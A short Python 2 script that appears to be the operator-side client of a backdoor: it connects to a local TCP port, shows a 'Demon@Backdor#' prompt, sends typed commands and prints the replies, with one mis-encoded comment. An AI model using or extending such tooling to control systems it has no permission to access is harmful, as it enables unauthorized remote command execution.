#coding: utf-8
import socket

c = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
c.connect(("127.0.0.1", 3389));

try:
    while 1:
        data = raw_input("Demon@Backdor# ");
        #�������Ϊ�գ�ʹ��send sendall�����Ῠס
        if not data:
            continue;
        c.send(data);
        if data.strip("\n") == "exit":
            break;
        res = c.recv(1024);
        print res;

    c.close();
except KeyboardInterrupt:
    pass
